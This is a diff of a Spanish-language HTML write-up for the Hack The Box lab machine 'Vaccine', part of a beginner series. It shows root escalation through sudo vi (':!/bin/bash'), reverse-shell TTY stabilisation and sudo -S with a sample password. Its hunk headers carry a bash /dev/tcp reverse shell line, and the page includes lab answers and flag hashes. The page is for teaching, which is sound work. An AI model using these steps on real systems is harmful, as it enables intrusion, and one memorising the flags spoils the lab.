+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sudo</span> -l
+<span class="cmt"># (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span></code></pre>
+    </figure><div class="fcard">
       <h4>▚ vi con sudo = root (GTFOBins)</h4>
-      <p>El permiso parece inofensivo (editar un archivo), pero <b><code class="ic">vi</code> puede ejecutar comandos del sistema desde dentro</b>. Si corre como root (por el sudo), la shell que abras también será de root. Es el mismo patrón de escalada de Knife (binario permitido vía sudo → <a href="https://gtfobins.github.io/gtfobins/vi/" target="_blank" rel="noopener">GTFOBins</a>, sección Sudo).</p>
+      <p>El permiso parece inofensivo (editar un archivo), pero <b><code class="ic">vi</code> puede ejecutar comandos del sistema desde dentro</b>. Si corre como root (por el sudo), la shell que abras también será de root. Es el mismo patrón de escalada de Knife (binario permitido vía sudo → <a href="https://gtfobins.github.io/gtfobins/vi/" target="_blank" rel="noopener noreferrer">GTFOBins</a>, sección Sudo).</p>
     </div>
 
     <h3 class="step">El escape a root</h3>
     <p class="f">Abre vi con el comando exacto autorizado y, dentro del editor, escapa a una shell:</p>
-    <pre><span class="k">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
 <span class="cmt"># si avisa de un swap file previo: pulsa la tecla 'e' (Edit anyway)</span>
 <span class="cmt"># dentro de vi, en modo normal, escribe:</span>
 :!/bin/bash
 <span class="cmt"># el prompt pasa a #  ·  whoami -&gt; root</span>
-<span class="k">cat</span> /root/root.txt   <span class="cmt"># root flag</span></pre>
-    <div class="why"><b>SUDO ES LITERAL</b>El permiso era el comando exacto. Intentar <code class="ic">sudo /bin/vi ... -c ':!...'</code> lo rechaza: sudo compara carácter por carácter y cualquier argumento extra ya no coincide. El escape se hace <b>dentro</b> de vi, no como argumento.</div>
-  </div>
+<span class="k">cat</span> /root/root.txt   <span class="cmt"># root flag</span></code></pre>
+    </figure><div class="why"><b>SUDO ES LITERAL</b>El permiso era el comando exacto. Intentar <code class="ic">sudo /bin/vi ... -c ':!...'</code> lo rechaza: sudo compara carácter por carácter y cualquier argumento extra ya no coincide. El escape se hace <b>dentro</b> de vi, no como argumento.</div>
+  </details></div>
 </section>
 
-<!-- TTY / TROUBLESHOOTING -->
-<section id="tty" style="--acc:var(--magenta)">
+<section id="tty">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">07 · CUANDO LA SHELL NO COOPERA</h2></div>
     <div class="sec-focus">El verdadero jefe final de Vaccine. Esto no lo cuenta ningún walkthrough.</div>
 
-    <p class="f">Una reverse shell no es una terminal "de verdad": le falta un <b>TTY</b>. Sin él, cosas interactivas como <code class="ic">su</code>, <code class="ic">ssh</code> o el escape de <code class="ic">vi</code> se caen con errores tipo <code class="ic">no job control</code> o <code class="ic">Inappropriate ioctl for device</code>. Estabilizar el TTY es el paso que lo arregla.</p>
+    <div class="hint"><b>PISTA</b>Distingue una shell que ejecuta órdenes de una terminal interactiva. Comprueba qué necesita el programa que estás intentando usar.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><p class="f">Una reverse shell no es una terminal "de verdad": le falta un <b>TTY</b>. Sin él, cosas interactivas como <code class="ic">su</code>, <code class="ic">ssh</code> o el escape de <code class="ic">vi</code> se caen con errores tipo <code class="ic">no job control</code> o <code class="ic">Inappropriate ioctl for device</code>. Estabilizar el TTY es el paso que lo arregla.</p>
 
     <h3 class="step">Estabilización completa de TTY</h3>
-    <pre><span class="cmt"># 1) en la reverse shell:</span>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="cmt"># 1) en la reverse shell:</span>
 <span class="k">python3</span> -c 'import pty; pty.spawn("/bin/bash")'
 <span class="cmt"># 2) pulsa Ctrl+Z  (suspende la shell, vuelves a Kali)</span>
 <span class="cmt"># 3) en Kali:</span>
 <span class="k">stty</span> raw -echo; fg
 <span class="cmt"># 4) pulsa Enter un par de veces</span>
 <span class="cmt"># 5) da contexto al terminal:</span>
-<span class="k">export</span> TERM=xterm</pre>
-    <div class="why"><b>MEJOR AÚN: EVITA LA REVERSE SHELL</b>Si tienes credenciales válidas de un usuario con shell, entra por <b>SSH</b>. Una sesión SSH trae TTY completo de fábrica, y te ahorras todo el baile del <code class="ic">stty</code>. En Vaccine, entrar por SSH como postgres es lo que hace que el <code class="ic">sudo vi</code> funcione sin pelear.</div>
+<span class="k">export</span> TERM=xterm</code></pre>
+    </figure><div class="why"><b>MEJOR AÚN: EVITA LA REVERSE SHELL</b>Si tienes credenciales válidas de un usuario con shell, entra por <b>SSH</b>. Una sesión SSH trae TTY completo de fábrica, y te ahorras todo el baile del <code class="ic">stty</code>. En Vaccine, entrar por SSH como postgres es lo que hace que el <code class="ic">sudo vi</code> funcione sin pelear.</div>
 
     <h3 class="step">Contraseñas sin terminal: sudo -S</h3>
     <p class="f">Si <code class="ic">sudo</code> se queja de <code class="ic">a terminal is required to read the password</code>, puedes pasarle la contraseña por la entrada estándar con <code class="ic">-S</code> (aunque para un comando interactivo como vi igual necesitarás TTY):</p>
-    <pre><span class="k">echo</span> 'P@s5w0rd!' | <span class="k">sudo</span> -S -l</pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">echo</span> 'P@s5w0rd!' | <span class="k">sudo</span> -S -l</code></pre>
 
-    <div class="warn"><b>EL BUG MÁS TONTO Y REAL: EL TECLADO</b>Dentro de vi, la tecla que abre los comandos del editor (la de los dos puntos) no producía nada al pulsarla. La causa no era técnica: el layout del teclado de Kali no coincidía con el teclado físico, así que esa tecla escribía otro carácter. Se diagnostica probando teclas o se arregla de raíz con <span class="mono">setxkbmap latam</span> (o <span class="mono">es</span>). Cuando algo "imposible" pasa, sospecha también de lo tonto.</div>
-  </div>
+    </figure><div class="warn"><b>EL BUG MÁS TONTO Y REAL: EL TECLADO</b>Dentro de vi, la tecla que abre los comandos del editor (la de los dos puntos) no producía nada al pulsarla. La causa no era técnica: el layout del teclado de Kali no coincidía con el teclado físico, así que esa tecla escribía otro carácter. Se diagnostica probando teclas o se arregla de raíz con <span class="mono">setxkbmap latam</span> (o <span class="mono">es</span>). Cuando algo "imposible" pasa, sospecha también de lo tonto.</div>
+  </details></div>
 </section>
 
-<!-- TASKS -->
-<section id="tasks" style="--acc:var(--amber)">
+<section id="tasks">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
     <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
-    <div class="tblwrap"><table>
-      <tr><th>Task</th><th>Respuesta</th></tr>
+    <details class="spoiler"><summary>Mostrar respuestas del laboratorio</summary><div class="tblwrap"><table>
+      <tr><th scope="col">Task</th><th scope="col">Respuesta</th></tr>
       <tr><td>Además de SSH y HTTP, ¿qué otro servicio hay?</td><td class="ans">ftp</td></tr>
       <tr><td>Usuario que permite login con cualquier contraseña</td><td class="ans">anonymous</td></tr>
       <tr><td>Nombre del archivo descargado por ese servicio</td><td class="ans">backup.zip</td></tr>
@@ -257,11 +204,10 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</pre>
       <tr><td>User flag (home de postgres)</td><td><code>ec9b13ca4d6229cd5cc1e09980965bf7</code></td></tr>
       <tr><td>Root flag (home de root)</td><td><code>dd6e058e814260bc70e9bbdef2715849</code></td></tr>
     </table></div>
-  </div>
+  </details></div>
 </section>
 
-<!-- TAKEAWAYS -->
-<section id="takeaways" style="--acc:var(--green)">
+<section id="takeaways">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">CONCEPTOS NUEVOS (vs LA SERIE)</h2></div>
     <div class="sec-focus">Lo que Vaccine suma a Cap, Knife y Forest.</div>
@@ -280,18 +226,4 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</pre>
     </ul>
   </div>
 </section>
-</main>
-
-<footer>
-  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "ocho eslabones y un teclado traidor: la que mas costo, la que mas enseño."</span></div>
-  <div>Vaccine · Hack The Box · Starting Point Tier 2 · guía para principiantes · #4 de la serie</div>
-  <div>
-    <a href="index.html">Knowledge base</a> ·
-    <a href="forest.html">← Forest</a> ·
-    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
-    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
-  </div>
-  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
-</footer>
-</body>
-</html>
+<nav class="series-nav" aria-label="Navegación por la serie"><a href="forest.html"><small>ANTERIOR · GUÍA 03</small><span>← Forest</span></a><a href="sauna.html"><small>SIGUIENTE · GUÍA 05</small><span>Sauna →</span></a></nav></div></div></main><footer class="footer"><div class="shell"><div class="footer-top"><div><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a><p>Sebastián Latorre Muñoz · Santiago, Chile</p></div><div class="footer-links"><a href="fundamentos.html">Fundamentos</a><a href="fundamentos.html#glosario">Glosario</a><a href="https://github.com/iphobiuss" rel="noopener noreferrer" target="_blank">GitHub</a><a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" rel="noopener noreferrer" target="_blank">LinkedIn</a><button class="small-button js-only" data-retro-toggle aria-pressed="false" type="button" hidden>Efectos retro</button></div></div><div class="footer-note">Material educativo para laboratorios y evaluaciones autorizadas. La base de técnicas utiliza ejemplos genéricos; los writeups documentan laboratorios de práctica de HTB. No son informes ni soluciones de exámenes de certificación.</div></div></footer><p id="action-status" class="sr-only" role="status" aria-live="polite"></p></body></html>
